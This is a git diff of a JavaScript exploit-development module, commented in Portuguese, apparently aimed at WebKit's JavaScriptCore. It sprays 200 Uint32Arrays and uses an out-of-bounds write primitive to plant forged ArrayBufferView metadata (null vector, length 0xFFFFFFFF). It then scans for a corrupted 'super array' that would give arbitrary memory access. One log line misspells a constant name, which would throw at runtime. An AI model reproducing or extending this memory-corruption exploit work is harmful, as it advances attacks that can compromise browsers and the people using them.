@@ -9,85 +9,149 @@ import {
     oob_read_absolute,
     clearOOBEnvironment
 } from '../core_exploit.mjs';
-// import { JSC_OFFSETS } from '../config.mjs'; // Não estamos focando em offsets de estrutura JS neste teste
+import { JSC_OFFSETS } from '../config.mjs';
 
 // ============================================================\n// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO\n// ============================================================
-const FNAME_INVESTIGATE_0x6C = "investigate0x70EffectOn0x6C_v11a";
+const FNAME_DETECT_SPRAY_CORRUPTION = "detectSprayedArrayCorruption_v12a";
 
 const CORRUPTION_OFFSET_TRIGGER = 0x70;
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
-const TARGET_OBSERVATION_OFFSET_0x6C = 0x6C; // O offset que estamos observando
-const PLANTED_VALUE_FOR_0x6C = new AdvancedInt64(0x42424242, 0x41414141); // AAAA_BBBB
+const FOCUSED_VICTIM_ABVIEW_START_OFFSET = 0x50; // Onde plantamos os dados no oob_buffer
+
+const NUM_SPRAY_OBJECTS = 200; // Aumentar se necessário, ex: 500 ou 1000
+const SPRAY_ELEMENT_VAL_A = 0xAAAAAAAA;
+const SPRAY_ELEMENT_VAL_B = 0xBBBBBBBB;
+const ORIGINAL_SPRAY_LENGTH = 8;
+
+const ADV64_ZERO = new AdvancedInt64(0, 0);
+const CORRUPTION_VALUE_UINT32_FFFFFFFF = 0xFFFFFFFF;
 
 // ============================================================\n// VARIÁVEIS GLOBAIS DE MÓDULO\n// ============================================================
-// sprayedVictimObjects não é usado neste teste específico, mas pode ser reintroduzido depois.
+let sprayedVictimObjects = [];
+let originalSprayedValues = []; // Para comparar após a corrupção
 
-export async function sprayAndInvestigateObjectExposure() { // Mantendo o nome da exportação por consistência
-    logS3(`--- Iniciando ${FNAME_INVESTIGATE_0x6C}: Investigar Efeito de 0x70 em 0x6C ---`, "test", FNAME_INVESTIGATE_0x6C);
+export async function sprayAndInvestigateObjectExposure() { // Mantendo o nome da exportação
+    logS3(`--- Iniciando ${FNAME_DETECT_SPRAY_CORRUPTION}: Detectar Qualquer Corrupção em Arrays Pulverizados ---`, "test", FNAME_DETECT_SPRAY_CORRUPTION);
 
     try {
         await triggerOOB_primitive();
         if (!oob_array_buffer_real || !oob_dataview_real) {
-            logS3("Falha ao inicializar o ambiente OOB.", "critical", FNAME_INVESTIGATE_0x6C);
+            logS3("Falha ao inicializar o ambiente OOB.", "critical", FNAME_DETECT_SPRAY_CORRUPTION);
             return;
         }
-        logS3("Ambiente OOB inicializado.", "info", FNAME_INVESTIGATE_0x6C);
+        logS3("Ambiente OOB inicializado.", "info", FNAME_DETECT_SPRAY_CORruption);
 
-        // FASE 1: Plantar valor conhecido em 0x6C
-        logS3(`FASE 1: Plantando ${PLANTED_VALUE_FOR_0x6C.toString(true)} em oob_buffer[${toHex(TARGET_OBSERVATION_OFFSET_0x6C)}]...`, "info", FNAME_INVESTIGATE_0x6C);
-        oob_write_absolute(TARGET_OBSERVATION_OFFSET_0x6C, PLANTED_VALUE_FOR_0x6C, 8);
-
-        const value_at_0x6C_before_trigger = oob_read_absolute(TARGET_OBSERVATION_OFFSET_0x6C, 8);
-        logS3(`  Valor em oob_buffer[${toHex(TARGET_OBSERVATION_OFFSET_0x6C)}] ANTES do trigger: ${isAdvancedInt64Object(value_at_0x6C_before_trigger) ? value_at_0x6C_before_trigger.toString(true) : toHex(value_at_0x6C_before_trigger)}`, "info", FNAME_INVESTIGATE_0x6C);
-
-        if (!isAdvancedInt64Object(value_at_0x6C_before_trigger) || !value_at_0x6C_before_trigger.equals(PLANTED_VALUE_FOR_0x6C)) {
-            logS3("  ALERTA: Valor plantado em 0x6C não foi lido corretamente!", "warn", FNAME_INVESTIGATE_0x6C);
+        // FASE 1: Pulverizar objetos Uint32Array e guardar seus valores originais
+        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${ORIGINAL_SPRAY_LENGTH}) e armazenando valores...`, "info", FNAME_DETECT_SPRAY_CORRUPTION);
+        sprayedVictimObjects = [];
+        originalSprayedValues = [];
+        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
+            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
+            u32arr[0] = SPRAY_ELEMENT_VAL_A;
+            u32arr[1] = SPRAY_ELEMENT_VAL_B;
+            for (let j = 2; j < ORIGINAL_SPRAY_LENGTH; j++) {
+                u32arr[j] = i; // Marcar com o índice do spray
+            }
+            sprayedVictimObjects.push(u32arr);
+            originalSprayedValues.push(Array.from(u32arr)); // Guardar cópia dos valores
         }
+        logS3("Pulverização e armazenamento de valores originais concluídos.", "good", FNAME_DETECT_SPRAY_CORRUPTION);
         await PAUSE_S3(50);
 
-        // FASE 2: Acionar a escrita OOB em 0x70
-        logS3(`FASE 2: Realizando escrita OOB em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_INVESTIGATE_0x6C);
-        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
-        logS3("Escrita OOB de trigger em 0x70 realizada.", "good", FNAME_INVESTIGATE_0x6C);
-        await PAUSE_S3(100); 
-
-        // FASE 3: Observar o valor em 0x6C APÓS a escrita em 0x70
-        logS3(`FASE 3: Lendo valor de oob_buffer[${toHex(TARGET_OBSERVATION_OFFSET_0x6C)}] APÓS trigger em 0x70...`, "info", FNAME_INVESTIGATE_0x6C);
-        const value_at_0x6C_after_trigger = oob_read_absolute(TARGET_OBSERVATION_OFFSET_0x6C, 8);
+        // FASE 2: Plantar valores no oob_array_buffer_real (como antes)
+        logS3(`FASE 2: Plantando futuros metadados (m_vector=0, m_length=0xFFFFFFFF) no oob_array_buffer_real...`, "info", FNAME_DETECT_SPRAY_CORRUPTION);
+        const targetVectorOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
+        const targetLengthOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
         
-        let after_trigger_str = isAdvancedInt64Object(value_at_0x6C_after_trigger) ? value_at_0x6C_after_trigger.toString(true) : toHex(value_at_0x6C_after_trigger);
-        logS3(`  Valor em oob_buffer[${toHex(TARGET_OBSERVATION_OFFSET_0x6C)}] APÓS trigger: ${after_trigger_str}`, "leak", FNAME_INVESTIGATE_0x6C);
+        oob_write_absolute(targetVectorOffset, ADV64_ZERO, 8);
+        oob_write_absolute(targetLengthOffset, CORRUPTION_VALUE_UINT32_FFFFFFFF, 4);
+        logS3(`  Valores plantados em oob_buffer[${toHex(targetVectorOffset)}] e oob_buffer[${toHex(targetLengthOffset)}]`, "info", FNAME_DETECT_SPRAY_CORRUPTION);
+        await PAUSE_S3(50);
 
-        if (isAdvancedInt64Object(value_at_0x6C_after_trigger)) {
-            if (value_at_0x6C_after_trigger.equals(PLANTED_VALUE_FOR_0x6C)) {
-                logS3("    Interpretação: O valor em 0x6C NÃO foi alterado pela escrita em 0x70.", "info", FNAME_INVESTIGATE_0x6C);
-                document.title = "0x6C INALTERADO";
-            } else if (value_at_0x6C_after_trigger.equals(CORRUPTION_VALUE_TRIGGER)) {
-                logS3("    Interpretação: O valor em 0x6C foi SOBRESCRITO pelo valor de trigger de 0x70!", "vuln", FNAME_INVESTIGATE_0x6C);
-                document.title = "0x6C IGUAL A 0x70!";
-            } else {
-                logS3("    Interpretação: O valor em 0x6C FOI ALTERADO para um novo valor.", "vuln", FNAME_INVESTIGATE_0x6C);
-                document.title = "0x6C ALTERADO!";
+        // FASE 3: Acionar a Corrupção OOB
+        logS3(`FASE 3: Realizando escrita OOB em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_DETECT_SPRAY_CORRUPTION);
+        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
+        logS3("Escrita OOB de trigger realizada.", "good", FNAME_DETECT_SPRAY_CORRUPTION);
+        await PAUSE_S3(200); // Aumentar pausa para dar mais tempo para efeitos colaterais se manifestarem
+
+        // FASE 4: Verificar TODOS os arrays pulverizados por QUALQUER mudança
+        logS3(`FASE 4: Verificando ${NUM_SPRAY_OBJECTS} arrays pulverizados por mudanças no length ou nos elementos...`, "info", FNAME_DETECT_SPRAY_CORRUPTION);
+        let corruptedArraysFound = 0;
+        for (let i = 0; i < sprayedVictimObjects.length; i++) {
+            const currentArray = sprayedVictimObjects[i];
+            const originalValues = originalSprayedValues[i];
+            let isCorrupted = false;
+            let corruptionDetails = "";
+
+            // Verificar mudança no length
+            if (currentArray.length !== ORIGINAL_SPRAY_LENGTH) {
+                isCorrupted = true;
+                corruptionDetails += ` Length alterado de ${ORIGINAL_SPRAY_LENGTH} para ${currentArray.length}.`;
+                if (currentArray.length === CORRUPTION_VALUE_UINT32_FFFFFFFF) {
+                    corruptionDetails += " (SUPER ARRAY LENGTH!)";
+                }
             }
-        } else {
-             logS3("    ALERTA: Não foi possível ler um AdvancedInt64 de 0x6C após o trigger.", "warn", FNAME_INVESTIGATE_0x6C);
-             document.title = "0x6C ERRO LEITURA";
+
+            // Verificar mudança nos elementos (mesmo que o length não tenha mudado, ou se mudou para algo acessível)
+            // Só verificar elementos se o length não for absurdamente grande para evitar loop infinito/crash
+            const maxElementsToCheck = (currentArray.length > 0 && currentArray.length < ORIGINAL_SPRAY_LENGTH * 2 && currentArray.length < 100) ? currentArray.length : ORIGINAL_SPRAY_LENGTH;
+            
+            for (let j = 0; j < ORIGINAL_SPRAY_LENGTH; j++) { // Iterar pelo tamanho original para comparação
+                let currentValue;
+                try {
+                    if (j < currentArray.length) { // Só ler se dentro do novo length
+                        currentValue = currentArray[j];
+                    } else if (isCorrupted && currentArray.length !== ORIGINAL_SPRAY_LENGTH) {
+                        // Se o length foi corrompido e é menor, não podemos ler o índice original
+                        // Se o length é maior, o currentArray[j] acima teria lido (ou tentado)
+                        // Este caso é mais para quando o length é menor
+                        corruptionDetails += ` Elemento original [${j}] inacessível (novo length: ${currentArray.length}).`;
+                        continue; // Não podemos comparar
+                    } else {
+                         // Length não mudou, mas j está fora do array? Impossível se j < ORIGINAL_SPRAY_LENGTH
+                         // Este caso é para segurança, mas não deve ser atingido se currentArray.length === ORIGINAL_SPRAY_LENGTH
+                        continue;
+                    }
+
+                } catch (e) {
+                    isCorrupted = true;
+                    corruptionDetails += ` Erro ao ler elemento [${j}]: ${e.message}.`;
+                    continue; // Pula para o próximo elemento ou array
+                }
+
+                if (currentValue !== originalValues[j]) {
+                    isCorrupted = true;
+                    corruptionDetails += ` Elemento [${j}] alterado de ${toHex(originalValues[j])} para ${toHex(currentValue)}.`;
+                }
+            }
+            
+            if (isCorrupted) {
+                logS3(`    !!! CORRUPÇÃO DETECTADA no array pulverizado índice [${i}] !!!`, "vuln", FNAME_DETECT_SPRAY_CORRUPTION);
+                logS3(`      Detalhes: ${corruptionDetails}`, "vuln", FNAME_DETECT_SPRAY_CORRUPTION);
+                corruptedArraysFound++;
+                document.title = `CORRUPÇÃO DETECTADA (${corruptedArraysFound})!`;
+                // Não parar no primeiro, continuar procurando por outros
+            }
         }
 
-        // FASE 4: Verificar se o valor em 0x70 ainda é o CORRUPTION_VALUE_TRIGGER
-        const value_at_0x70_after_trigger = oob_read_absolute(CORRUPTION_OFFSET_TRIGGER, 8);
-        logS3(`  Valor em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] (local do trigger) APÓS tudo: ${isAdvancedInt64Object(value_at_0x70_after_trigger) ? value_at_0x70_after_trigger.toString(true) : toHex(value_at_0x70_after_trigger)}`, "info", FNAME_INVESTIGATE_0x6C);
+        if (corruptedArraysFound > 0) {
+            logS3(`  Total de ${corruptedArraysFound} arrays pulverizados encontrados com alguma corrupção.`, "good", FNAME_DETECT_SPRAY_CORRUPTION);
+        } else {
+            logS3("  Nenhuma corrupção detectada nos arrays pulverizados (nem no length, nem nos elementos verificados).", "warn", FNAME_DETECT_SPRAY_CORRUPTION);
+            document.title = "Nenhuma Corrupção em Spray";
+        }
 
-
-        logS3("INVESTIGAÇÃO DO EFEITO EM 0x6C CONCLUÍDA.", "test", FNAME_INVESTIGATE_0x6C);
+        logS3("INVESTIGAÇÃO DE CORRUPÇÃO EM SPRAY CONCLUÍDA.", "test", FNAME_DETECT_SPRAY_CORRUPTION);
 
     } catch (e) {
-        logS3(`ERRO CRÍTICO em ${FNAME_INVESTIGATE_0x6C}: ${e.message}`, "critical", FNAME_INVESTIGATE_0x6C);
-        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_INVESTIGATE_0x6C);
-        document.title = `${FNAME_INVESTIGATE_0x6C} FALHOU!`;
+        logS3(`ERRO CRÍTICO em ${FNAME_DETECT_SPRAY_CORRUPTION}: ${e.message}`, "critical", FNAME_DETECT_SPRAY_CORRUPTION);
+        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_DETECT_SPRAY_CORRUPTION);
+        document.title = `${FNAME_DETECT_SPRAY_CORRUPTION} FALHOU!`;
     } finally {
+        sprayedVictimObjects = [];
+        originalSprayedValues = [];
         clearOOBEnvironment();
-        logS3(`--- ${FNAME_INVESTIGATE_0x6C} Concluído ---`, "test", FNAME_INVESTIGATE_0x6C);
+        logS3(`--- ${FNAME_DETECT_SPRAY_CORRUPTION} Concluído ---`, "test", FNAME_DETECT_SPRAY_CORRUPTION);
     }
 }
